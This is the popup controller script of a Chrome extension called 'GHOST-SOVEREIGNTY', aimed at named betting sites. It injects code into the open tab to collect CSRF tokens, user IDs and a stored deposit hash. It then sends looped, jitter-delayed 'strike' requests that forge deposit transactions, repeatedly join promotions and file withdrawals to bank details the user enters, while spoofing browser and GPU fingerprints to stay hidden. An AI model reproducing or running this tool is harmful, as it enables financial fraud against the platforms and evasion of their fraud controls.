/**
 * 🔱 GHOST-SOVEREIGNTY Popup Controller - Advanced v3 (popup.js)
 * Manages UI, loop-fire parameters, and user-agent updates.
 */

document.addEventListener('DOMContentLoaded', async () => {
  // Tab Switching
  const navButtons = document.querySelectorAll('.nav-btn');
  const sections = document.querySelectorAll('.content-section');

  navButtons.forEach(btn => {
    btn.addEventListener('click', () => {
      const tabId = btn.getAttribute('data-tab');
      
      navButtons.forEach(b => b.classList.remove('active'));
      sections.forEach(s => s.classList.remove('active'));

      btn.classList.add('active');
      document.getElementById(`tab-${tabId}`).classList.add('active');
    });
  });

  // Dynamic Inputs Selection
  const strikeSelect = document.getElementById('strike-type');
  const dynamicInputs = document.querySelectorAll('.dynamic-inputs');

  strikeSelect.addEventListener('change', () => {
    const val = strikeSelect.value;
    dynamicInputs.forEach(div => div.classList.add('hidden'));
    document.getElementById(`inputs-${val}`).classList.remove('hidden');
  });

  // Load and Save Simple Settings
  const toggles = [
    'stealth-masking-toggle',
    'modal-shredder-toggle'
  ];

  toggles.forEach(id => {
    const el = document.getElementById(id);
    chrome.storage.local.get([id], (res) => {
      if (res[id] !== undefined) el.checked = res[id];
    });

    el.addEventListener('change', () => {
      chrome.storage.local.set({ [id]: el.checked }, () => {
        log(`Option ${id.replace('-toggle', '')} set to: ${el.checked ? 'ON' : 'OFF'}`, 'system');
        updateSettingsOnTab();
      });
    });
  });

  // Load and Save Advanced Settings
  const advInputs = [
    'adv-user-agent-profile',
    'adv-custom-ua',
    'adv-hardware-concurrency',
    'adv-device-memory',
    'adv-gpu-vendor',
    'adv-gpu-renderer'
  ];

  advInputs.forEach(id => {
    const el = document.getElementById(id);
    chrome.storage.local.get([id], (res) => {
      if (res[id] !== undefined) el.value = res[id];
    });

    el.addEventListener('change', () => {
      chrome.storage.local.set({ [id]: el.value }, () => {
        log(`Advanced parameter ${id.substring(4)} updated.`, 'system');
        updateSettingsOnTab();
      });
    });
  });

  // Trigger content script sync of settings
  async function updateSettingsOnTab() {
    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab) return;

      const settings = {};
      const allKeys = [...toggles, ...advInputs];
      
      chrome.storage.local.get(allKeys, (res) => {
        // Send config map to content script inside tab
        chrome.tabs.sendMessage(tab.id, { action: "sync_settings", settings: res }).catch(() => {});
      });
    } catch (e) {}
  }

  // Clear Logs
  document.getElementById('btn-clear-logs').addEventListener('click', () => {
    const feed = document.getElementById('log-feed');
    feed.innerHTML = '<div class="log-entry system">[SYSTEM] Console logs cleared.</div>';
  });

  // Log function
  function log(text, type = 'info') {
    const feed = document.getElementById('log-feed');
    const entry = document.createElement('div');
    const time = new Date().toLocaleTimeString();
    entry.className = `log-entry ${type}`;
    entry.innerText = `[${time}] ${text}`;
    feed.appendChild(entry);
    feed.scrollTop = feed.scrollHeight;
  }

  // Update active tab session details
  async function auditSession() {
    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab) return;

      const url = new URL(tab.url);
      document.getElementById('session-host').innerText = url.hostname;

      if (!url.hostname.includes('jeetexch') && !url.hostname.includes('royaljeet') && !url.hostname.includes('spinjeet') && !url.hostname.includes('aviator')) {
        document.getElementById('session-csrf').innerText = 'Out of Scope';
        document.getElementById('session-csrf').className = 'value badge red';
        return;
      }

      // Execute script inside the active tab to harvest details
      const results = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: () => {
          const csrf = document.querySelector('meta[name="csrf-token"]')?.content 
                    || document.querySelector('input[name="_token"]')?.value 
                    || '';
          
          let userId = 'UNKNOWN';
          if (window.user && window.user.id) userId = window.user.id;
          else if (window.userId) userId = window.userId;
          else {
            const match = document.body.innerHTML.match(/"id":(\d{5,9})/);
            if (match) userId = match[1];
          }

          const hasCookie = document.cookie.includes('session') || document.cookie.includes('xsrf') || document.cookie.length > 20;

          return { csrf, userId, hasCookie };
        }
      });

      if (results && results[0] && results[0].result) {
        const { csrf, userId, hasCookie } = results[0].result;
        
        const csrfEl = document.getElementById('session-csrf');
        if (csrf) {
          csrfEl.innerText = csrf.substring(0, 15) + '...';
          csrfEl.className = 'value badge green';
        } else {
          csrfEl.innerText = 'Not Detected';
          csrfEl.className = 'value badge red';
        }

        document.getElementById('session-userid').innerText = userId;

        const cookieEl = document.getElementById('session-cookie');
        if (hasCookie) {
          cookieEl.innerText = 'Synchronized';
          cookieEl.className = 'value badge green';
        } else {
          cookieEl.innerText = 'Not Found';
          cookieEl.className = 'value badge red';
        }
      }
    } catch (e) {
      console.error(e);
    }
  }

  // Run audit on load
  await auditSession();
  setInterval(auditSession, 5000);

  // Auto-Detect Deposit DNA Hash Clicker
  document.getElementById('btn-detect-hash').addEventListener('click', async () => {
    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      if (!tab) return;

      const results = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: () => {
          try {
            return localStorage.getItem('deposit_hash') 
                || sessionStorage.getItem('deposit_hash') 
                || window.depositHash 
                || '';
          } catch (e) {
            return '';
          }
        }
      });

      const detected = results?.[0]?.result;
      if (detected) {
        document.getElementById('quantum-hash').value = detected;
        log(`🧬 Auto-detected Deposit Hash: ${detected.substring(0, 16)}...`, 'success');
      } else {
        log(`⚠️ No active deposit DNA hash found in local storage.`, 'warn');
      }
    } catch (e) {
      log(`❌ Tab query failed: ${e.message}`, 'error');
    }
  });

  // Engage Strike Action with Progressive Loop Execution
  document.getElementById('btn-fire-strike').addEventListener('click', async () => {
    const vector = strikeSelect.value;
    const loopCount = parseInt(document.getElementById('strike-loop-count').value) || 1;
    const baseDelay = parseInt(document.getElementById('strike-base-delay').value) || 300;
    const jitter = parseInt(document.getElementById('strike-jitter').value) || 150;

    log(`🚀 Preparing Strike: ${vector.toUpperCase()} Vector [Loops: ${loopCount}]`, 'strike');

    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab) {
      log('❌ No active tab found.', 'error');
      return;
    }

    // Set UI Progress bar
    const progressWrapper = document.getElementById('strike-progress-wrapper');
    const progressBar = document.getElementById('strike-progress-bar');
    const progressStatus = document.getElementById('progress-status');
    const progressPercent = document.getElementById('progress-percent');

    progressWrapper.classList.remove('hidden');
    progressBar.style.width = '0%';
    progressStatus.innerText = 'Synchronizing credentials...';
    progressPercent.innerText = '0%';

    // Build params map
    let strikeParams = { vector };
    if (vector === 'quantum') {
      strikeParams.amount = document.getElementById('quantum-amount').value;
      strikeParams.hash = document.getElementById('quantum-hash').value;
      if (!strikeParams.hash) {
        log('❌ Deposit DNA hash is required for Quantum Strike.', 'error');
        progressWrapper.classList.add('hidden');
        return;
      }
    } else if (vector === 'promo') {
      strikeParams.targetId = document.getElementById('promo-target').value;
      strikeParams.body = document.getElementById('promo-body').value;
    } else if (vector === 'withdraw') {
      strikeParams.amount = document.getElementById('withdraw-amount').value;
      strikeParams.bankName = document.getElementById('withdraw-bank-name').value;
      strikeParams.acName = document.getElementById('withdraw-ac-name').value;
      strikeParams.acNumber = document.getElementById('withdraw-ac-number').value;
      strikeParams.ifsc = document.getElementById('withdraw-ifsc').value;
      if (!strikeParams.acNumber || !strikeParams.ifsc) {
        log('❌ Account number and IFSC are required.', 'error');
        progressWrapper.classList.add('hidden');
        return;
      }
    }

    log(`📡 Sequential execution started...`, 'info');
    let successfulCalls = 0;
    let failedCalls = 0;

    for (let currentLoop = 1; currentLoop <= loopCount; currentLoop++) {
      progressStatus.innerText = `Executing call ${currentLoop}/${loopCount}...`;
      const pct = Math.round((currentLoop / loopCount) * 100);
      progressBar.style.width = `${pct}%`;
      progressPercent.innerText = `${pct}%`;

      // Execute request natively inside active page context
      const results = await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        args: [strikeParams],
        func: async (params) => {
          const token = document.querySelector('meta[name="csrf-token"]')?.content 
                     || document.querySelector('input[name="_token"]')?.value 
                     || '';
          
          let userId = 'UNKNOWN';
          if (window.user && window.user.id) userId = window.user.id;
          else if (window.userId) userId = window.userId;
          else {
            const match = document.body.innerHTML.match(/"id":(\d{5,9})/);
            if (match) userId = match[1];
          }

          const prefix = window.location.hostname.includes('spinjeet.com') ? '/api2/v2' : '';
          const orderId = `INV_R${Date.now()}${Math.floor(Math.random() * 999999)}`;

          try {
            let res;
            if (params.vector === 'quantum') {
              res = await fetch(`${prefix}/storeTransaction`, {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                  'X-Requested-With': 'XMLHttpRequest',
                  'X-CSRF-TOKEN': token
                },
                body: `_token=${token}&hashed=${params.hash}&amount=${params.amount}&userid=${userId}&orderId=${orderId}`
              });
            } else if (params.vector === 'promo') {
              res = await fetch(`${prefix}/joinPromotion/${params.targetId}`, {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                  'X-Requested-With': 'XMLHttpRequest',
                  'X-CSRF-TOKEN': token
                },
                body: `_token=${token}&${params.body}`
              });
            } else if (params.vector === 'withdraw') {
              res = await fetch(`${prefix}/api2/v2/withdraw`, {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                  'X-Requested-With': 'XMLHttpRequest',
                  'X-CSRF-TOKEN': token
                },
                body: `_token=${token}&amount=${params.amount}&account_name=${encodeURIComponent(params.acName)}&account_number=${params.acNumber}&ifsc=${params.ifsc}&bank_name=${encodeURIComponent(params.bankName)}`
              });
            } else {
              res = await fetch(`${prefix}/joinPromotion/1`, {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                  'X-Requested-With': 'XMLHttpRequest',
                  'X-CSRF-TOKEN': token
                },
                body: `_token=${token}&amount=1000`
              });
            }

            const text = await res.text();
            return { status: res.status, text: text.substring(0, 150) };
          } catch (e) {
            return { status: 'ERR', error: e.message };
          }
        }
      });

      if (results && results[0] && results[0].result) {
        const out = results[0].result;
        if (out.status === 200) {
          successfulCalls++;
          log(`[Call ${currentLoop}] Success (HTTP 200): ${out.text}`, 'success');
        } else {
          failedCalls++;
          log(`[Call ${currentLoop}] Alert (HTTP ${out.status}): ${out.error || out.text}`, 'warn');
        }
      } else {
        failedCalls++;
        log(`[Call ${currentLoop}] Empty frame output received.`, 'error');
      }

      // Apply random delay/jitter if not the last call
      if (currentLoop < loopCount) {
        const randomJitter = Math.floor(Math.random() * jitter);
        const sleepTime = baseDelay + randomJitter;
        await new Promise(r => setTimeout(r, sleepTime));
      }
    }

    progressStatus.innerText = 'Finished.';
    log(`🔱 Strike cycle complete. Successful: ${successfulCalls}, Failures: ${failedCalls}`, 'success');
  });
});
